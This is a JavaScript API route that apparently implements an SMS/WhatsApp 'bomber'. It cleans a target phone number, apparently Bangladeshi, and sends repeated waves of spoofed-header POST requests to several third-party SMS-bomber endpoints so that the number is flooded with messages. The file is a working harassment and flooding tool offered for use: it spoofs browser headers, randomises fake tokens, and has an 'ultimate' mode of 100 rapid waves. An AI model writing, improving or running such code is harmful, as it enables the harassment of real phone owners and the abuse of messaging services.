// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Number Cleaning (Strictly 11 digits)
  let cleanNumber = number.toString().replace(/\D/g, ''); 
  if (cleanNumber.startsWith('88')) cleanNumber = cleanNumber.substring(2);
  if (cleanNumber.length > 11) cleanNumber = cleanNumber.substring(0, 11);

  // 2. Target Endpoints (Directly hitting the root and common API paths)
  const targetLinks = [
    'https://nuke-sms-bomber.pages.dev/',
    'https://shadowx-sms-bomber.onrender.com/',
    'https://nuke-sms-bomber.pages.dev/api/attack',
    'https://shadowx-sms-bomber.onrender.com/api/send'
  ];

  const runAttack = async () => {
    const totalWaves = isUltimate ? 100 : amount; 
    const delay = isUltimate ? 400 : 1500; 

    for (let i = 0; i < totalWaves; i++) {
      const attackPromises = targetLinks.map(async (link) => {
        try {
          // 3. Extreme Header Spoofing
          // Amra ekhane ekta real browser er pura identity pathacchi
          const response = await fetch(link, {
            method: 'POST',
            headers: { 
              'Content-Type': 'application/json',
              'Accept': 'application/json, text/plain, */*',
              'Accept-Language': 'en-US,en;q=0.9',
              'Cache-Control': 'no-cache',
              'Connection': 'keep-alive',
              'Origin': link,
              'Referer': link,
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              'X-Requested-With': 'XMLHttpRequest',
            },
            // 4. Massive Payload (All possible parameters)
            body: JSON.stringify({
              number: cleanNumber,
              phone: cleanNumber,
              target: cleanNumber,
              mobile: cleanNumber,
              amount: 1,
              count: 1,
              qty: 1,
              country: "BD",
              service: "whatsapp",
              msg: "Ultimate Attack",
              auth: "true",
              token: "secret_token_" + Math.random().toString(36).substring(7),
              is_active: true,
              status: "active",
              method: "sms"
            }),
            mode: 'cors'
          });

          console.log(`[Wave ${i}] Hit: ${link} | Status: ${response.status}`);

        } catch (err) {
          console.error(`[Wave ${i}] Error: ${err.message}`);
        }
      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
  });
}
